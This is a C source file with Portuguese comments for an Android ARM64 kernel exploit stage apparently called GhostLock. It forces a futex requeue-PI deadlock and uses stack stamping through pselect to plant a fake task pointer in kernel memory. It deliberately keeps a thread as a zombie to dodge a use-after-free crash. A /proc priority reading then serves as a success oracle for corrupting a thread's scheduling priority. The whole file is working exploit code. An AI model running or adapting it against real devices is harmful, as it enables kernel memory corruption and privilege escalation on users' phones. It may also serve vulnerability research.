/*
 * ghostlock_oracle_v2.c — GhostLock/aquaman, oraculo por valor (1 trial proc).
 *
 * Um trial por execucao. Uso:
 *   ghostlock_oracle_v2 nostamp          (i) controle, sem carimbo
 *   ghostlock_oracle_v2 stamp 0x120      (ii)/(iii) carimbo + fake
 *
 * Fluxo: waiter trava f_chain, pendura em FWRQ (f_wait -> f_target, timeout
 * 5s); owner trava f_target e deadlocka em f_chain; main faz CMP_REQUEUE_PI
 * e exige EDEADLK (errno 35) senao aborta. Leitor le /proc/<waiter>/stat f18
 * (priority = prio-100) e f19 (nice, controle) ANTES; main acorda o waiter
 * (FUPI f_target ou timeout), waiter carimba e dorme 60s vivo; consumer faz
 * pthread_setschedparam(BATCH) no waiter; leitor le f18/f19 DEPOIS.
 * Intacto: f18 20/20. Hit: f18 -100, f19 0.
 *
 * Build (NDK r29, ARM64, API 28):
 *   aarch64-linux-android28-clang -O2 -Wall -Wextra -static \
 *     ghostlock_oracle_v2.c -o ghostlock_oracle_v2
 */
#define _GNU_SOURCE
#include <errno.h>
#include <fcntl.h>
#include <pthread.h>
#include <sched.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/select.h>
#include <sys/syscall.h>
#include <time.h>
#include <unistd.h>

#include "ghostlock_target.h"

#ifndef __NR_futex
#define __NR_futex 98
#endif
#ifndef __NR_gettid
#define __NR_gettid 178
#endif
#define FUTEX_LOCK_PI          6
#define FUTEX_UNLOCK_PI        7
#define FUTEX_WAIT_REQUEUE_PI  11
#define FUTEX_CMP_REQUEUE_PI   12
#define FUTEX_PRIVATE_FLAG     128
#define EDEADLK                35

#define FLPI (FUTEX_LOCK_PI | FUTEX_PRIVATE_FLAG)
#define FUPI (FUTEX_UNLOCK_PI | FUTEX_PRIVATE_FLAG)
#define FWRQ (FUTEX_WAIT_REQUEUE_PI | FUTEX_PRIVATE_FLAG)
#define FCRQ (FUTEX_CMP_REQUEUE_PI | FUTEX_PRIVATE_FLAG)

#define NWORDS (3 * GL_PSEL_SIZE / 8)   /* 3 fd_sets de 40B = 15 u64 */

static uint32_t f_wait, f_target, f_chain;
static volatile int w_ready, w_waiting, w_done, o_started, o_exited;
static volatile int waiter_sys_tid;
static volatile int stamped, consumer_done, post_done;
static volatile int hb_go, hb_stop;
static volatile int f18_post, f19_post;
static volatile uint64_t g_pad;
static volatile int g_stamp_mode;
static int g_hold;
static uint64_t deep_words[NWORDS], shallow_words[NWORDS];
static void *fake_page;

static long xfutex(void *u1, int op, uint32_t val, void *to, void *u2,
                   uint32_t v3) {
    return syscall(__NR_futex, u1, op, val, to, u2, v3);
}

static uint64_t now_ns(void) {
    struct timespec ts;
    clock_gettime(CLOCK_MONOTONIC, &ts);
    return (uint64_t)ts.tv_sec * 1000000000ULL + (uint64_t)ts.tv_nsec;
}

/* pselect com pattern controlado. nfds=320 => size 0x28, fica no stack. */
__attribute__((noinline)) static void psel_with(const uint64_t *w) {
    const fd_set *s0 = (const fd_set *)(w + 0);
    const fd_set *s1 = (const fd_set *)(w + 5);
    const fd_set *s2 = (const fd_set *)(w + 10);
    struct timespec ts = { 0, 0 };

    pselect(GL_PSEL_MAX_NFDS, (fd_set *)s0, (fd_set *)s1, (fd_set *)s2,
            &ts, NULL);
}

/*
 * stamp_at: VLA dimensionado pelo pad em runtime. O compilador nao tem como
 * saber o tamanho no prologo: emite sub sp,sp,Xn dinamico, entao o pselect
 * la dentro roda com SP deslocado de pad. Touch a cada 64B + barrier: o VLA
 * nao pode sumir nem virar memset de tamanho variavel sobre frame fixo
 * (esse era o bug do stamper antigo: vla[4096] fixo + memset(len)).
 */
__attribute__((noinline)) static void stamp_at(uint64_t pad,
                                               const uint64_t *w) {
    if (pad < 16)
        pad = 16;
    volatile unsigned char vla[pad];
    uint64_t i;

    for (i = 0; i < pad; i += 64)
        vla[i] = (unsigned char)(i & 0xff);
    vla[pad - 1] = 0xaa;
    __asm__ volatile("" :: "r"(vla) : "memory");
    psel_with(w);
    __asm__ volatile("" :: "r"(vla) : "memory");
}

/* Profundo primeiro, raso (pad-0x78) depois. SPs 0x78 apart, provado. */
__attribute__((noinline)) static void stamp(uint64_t pad) {
    stamp_at(pad, deep_words);
    stamp_at(pad > GL_PSEL_SLOT3_OFF ? pad - GL_PSEL_SLOT3_OFF : 16,
             shallow_words);
}

/* pin CPU0: tira migracao da janela de crash, o resto do projeto faz igual */
static void pin_cpu0(void) {
    cpu_set_t m;

    CPU_ZERO(&m);
    CPU_SET(0, &m);
    if (sched_setaffinity(0, sizeof(m), &m))
        printf("[warn] affinity errno=%d (segue sem pin)\n", errno);
}

static void *waiter_fn(void *u) {
    (void)u;

    pin_cpu0();
    if (xfutex(&f_chain, FLPI, 0, NULL, NULL, 0))
        return NULL;
    waiter_sys_tid = (int)syscall(__NR_gettid);
    w_ready = 1;
    while (!o_started)
        usleep(1000);
    {
        /* acorda por TIMEOUT proprio. main nao toca em nenhum futex do trio:
         * unlock de fora corre com o timeout na mesma wait tree. */
        struct timespec ts;
        clock_gettime(CLOCK_MONOTONIC, &ts);
        ts.tv_sec += 2;
        w_waiting = 1;
        xfutex(&f_wait, FWRQ, 0, &ts, &f_target, 0);
    }
    xfutex(&f_chain, FUPI, 0, NULL, NULL, 0);   /* owner sai do deadlock */
    w_done = 1;
    if (g_stamp_mode)
        stamp(g_pad);
    stamped = 1;
    sleep(60);   /* vivo p/ o consumer; exit do main nos mata antes */
    return NULL;
}

static void *owner_fn(void *u) {
    (void)u;

    pin_cpu0();
    if (xfutex(&f_target, FLPI, 0, NULL, NULL, 0)) {
        o_exited = 1;
        return NULL;
    }
    while (!w_ready)
        usleep(1000);
    o_started = 1;
    xfutex(&f_chain, FLPI, 0, NULL, NULL, 0);   /* deadlock por design */
    o_exited = 1;
    return NULL;   /* NAO joined: vira zumbi de proposito, ver main() */
}

/* heartbeat: localiza a morte. parou no meio do settle = morte assincrona;
 * parou depois de [consumer-before] = o walk do consumer. */
static void *heartbeat_fn(void *u) {
    uint64_t t0;
    (void)u;

    pin_cpu0();
    while (!hb_go)
        usleep(10000);
    t0 = now_ns();
    while (!hb_stop) {
        printf("[hb] +%llums\n",
               (unsigned long long)((now_ns() - t0) / 1000000));
        usleep(500000);
    }
    return NULL;
}

static int read_stat(int tid, int *prio, int *nice) {
    char path[64], buf[1024], st;
    int fd, n, p = 0, v = 0;

    snprintf(path, sizeof(path), "/proc/%d/stat", tid);
    fd = open(path, O_RDONLY);
    if (fd < 0)
        return -1;
    n = read(fd, buf, sizeof(buf) - 1);
    close(fd);
    if (n <= 0)
        return -1;
    buf[n] = 0;
    {
        char *rp = strrchr(buf, ')');
        if (!rp)
            return -1;
        /* f3..f19: state + 14 suprimidos + priority + nice */
        if (sscanf(rp + 1, " %c %*d %*d %*d %*d %*d %*u %*u %*u %*u %*u"
                   " %*lu %*lu %*ld %*ld %d %d", &st, &p, &v) != 3)
            return -1;
    }
    *prio = p;
    *nice = v;
    return 0;
}

static void *reader_fn(void *u) {
    int spins = 0;
    (void)u;

    /* so o post-read. o pre-read era codigo novo na janela do crash e o
     * parser ja esta provado pelo trial 1 (f18=20 f19=0). */
    while (!consumer_done && spins++ < 900)
        usleep(10000);
    if (!consumer_done)
        return NULL;
    usleep(200000);
    if (read_stat(waiter_sys_tid, (int *)&f18_post, (int *)&f19_post) == 0)
        post_done = 1;
    return NULL;
}

static int wait_flag(volatile int *f, int secs) {
    int spins = 0;

    while (!*f && spins++ < secs * 100)
        usleep(10000);
    return *f ? 0 : -1;
}

int main(int argc, char **argv) {
    pthread_t w, o, r, hb;
    struct sched_param p = { .sched_priority = 0 };
    uint64_t t0, dt;
    int rc, spins;

    setbuf(stdout, NULL);
    pin_cpu0();
    if (argc < 2 || (strcmp(argv[1], "nostamp") &&
                     strcmp(argv[1], "stamp"))) {
        printf("uso: %s nostamp | stamp <pad_hex> [hold]\n", argv[0]);
        return 3;
    }
    g_stamp_mode = !strcmp(argv[1], "stamp");
    g_pad = (argc > 2) ? strtoull(argv[2], NULL, 0) : 0;
    /* hold em qualquer posicao depois do modo: nostamp hold / stamp 0x120 hold */
    g_hold = (argc > 2 && !strcmp(argv[2], "hold")) ||
             (argc > 3 && !strcmp(argv[3], "hold"));

    if (g_stamp_mode) {
        uint64_t b = (g_pad >= GL_PSELECT_SHIFT_MIN)
                         ? g_pad - GL_PSELECT_SHIFT_MIN + 0x30 : 0x30;
        size_t i;

        fake_page = mmap(NULL, 4096, PROT_READ | PROT_WRITE,
                         MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
        if (fake_page == MAP_FAILED) {
            printf("[setup] mmap falhou\n");
            return 3;
        }
        if (mlock(fake_page, 4096)) {
            printf("[setup] mlock falhou errno=%d\n", errno);
            return 3;
        }
        memset(fake_page, 0, 4096);
        *(volatile uint32_t *)((char *)fake_page + GL_TASK_PRIO) = 0;
        for (i = 0; i < NWORDS; i++)
            deep_words[i] = shallow_words[i] = GL_PAGE_OFFSET;
        /* waiter->task cai no byte B do span; B<0x78 vai no deep */
        if (b < GL_PSEL_SPAN && !(b & 7)) {
            if (b < GL_PSEL_SLOT3_OFF)
                deep_words[b / 8] = (uint64_t)(uintptr_t)fake_page;
            else
                shallow_words[(b - GL_PSEL_SLOT3_OFF) / 8] =
                    (uint64_t)(uintptr_t)fake_page;
        }
        printf("[info] mode=stamp pad=%#llx fake=%p fake_byte=%#llx\n",
               (unsigned long long)g_pad, fake_page,
               (unsigned long long)b);
    } else {
        printf("[info] mode=nostamp (controle, sem carimbo)\n");
    }

    f_wait = f_target = f_chain = 0;
    if (pthread_create(&w, NULL, waiter_fn, NULL) ||
        pthread_create(&o, NULL, owner_fn, NULL) ||
        pthread_create(&r, NULL, reader_fn, NULL) ||
        pthread_create(&hb, NULL, heartbeat_fn, NULL)) {
        printf("[setup] pthread_create falhou\n");
        return 3;
    }

    spins = 0;
    while ((!w_waiting || !o_started) && spins++ < 1500)
        usleep(10000);
    if (!w_waiting || !o_started) {
        printf("[abort] waiter/owner nao penduraram\n");
        return 2;
    }
    usleep(300000);

    errno = 0;
    xfutex(&f_wait, FCRQ, 1, (void *)(uintptr_t)1, &f_target, 0);
    if (errno != EDEADLK) {
        printf("[abort] cmp errno=%d, esperado 35. sem EDEADLK, sem trial.\n",
               errno);
        return 2;
    }
    printf("[cmp] errno=35 EDEADLK ok, tid_waiter=%d\n", waiter_sys_tid);

    /* main nao destrava mais nada: o waiter acorda pelo proprio timeout (2s),
     * solta a chain e o owner sai. nada aqui compete na wait tree. */
    if (wait_flag(&w_done, 15)) {
        printf("[abort] waiter nao acordou pelo timeout\n");
        return 2;
    }
    printf("[teardown] waiter acordou e soltou a chain\n");

    /* SEM pthread_join(owner) de proposito.
     * O owner fica ZUMBI: task_struct e kernel stack dele continuam mapeados,
     * e o rt_mutex_waiter dele (no do owner na wait tree do f_chain) segue
     * valido. Com join, o reaping libera essa memoria e o walk do consumer
     * (__sched_setscheduler -> adjust_pi) pisa em heap freed. Foi
     * exatamente o crash do gate v2. */
    if (wait_flag(&o_exited, 15)) {
        printf("[abort] owner nao saiu do deadlock\n");
        return 2;
    }
    printf("[teardown] owner virou zumbi (nao joined), task_struct vivo\n");

    if (wait_flag(&stamped, 12)) {
        printf("[abort] waiter nao carimbou a tempo\n");
        return 2;
    }
    printf("[teardown] carimbo feito, settle 250ms com heartbeat\n");

    hb_go = 1;
    /* 2.5s -> 250ms: o ator assincrono mata entre +2000 e +2500ms do settle
     * (4 boots, mesmo ponto). o consumer tem que rodar antes disso, senao o
     * f18_post nao existe. */
    usleep(250000);
    printf("[teardown] settle finished\n");

    t0 = now_ns();
    errno = 0;
    printf("[consumer-before] tid=%d\n", waiter_sys_tid);
    rc = pthread_setschedparam(w, SCHED_BATCH, &p);
    dt = now_ns() - t0;
    printf("[consumer-after] rc=%d errno=%d us=%llu %s\n", rc, errno,
           (unsigned long long)dt / 1000,
           dt > 1000000ULL ? "STALL" : "rapido");
    hb_stop = g_hold ? 0 : 1;
    consumer_done = 1;

    if (wait_flag(&post_done, 15)) {
        printf("[abort] leitor nao leu o post\n");
        return 2;
    }
    printf("[result] pad=%#llx f18_post=%d f19=%d %s survived=1\n",
           (unsigned long long)g_pad, f18_post, f19_post,
           f18_post == -100 ? "HIT" : (f18_post == 20 ? "MISS" : "ESQUISITO"));

    /* hold: o processo NAO sai nunca, logo exit_pi_state do main nunca roda.
     * se o device morrer mesmo assim, o exit nao era o ator (e a gente
     * queimou um boot provando isso, obviously). */
    if (g_hold) {
        printf("[hold] entrou, processo nao vai sair\n");
        for (;;) {
            printf("[hold] vivo\n");
            usleep(500000);
        }
    }
    return 0;
}
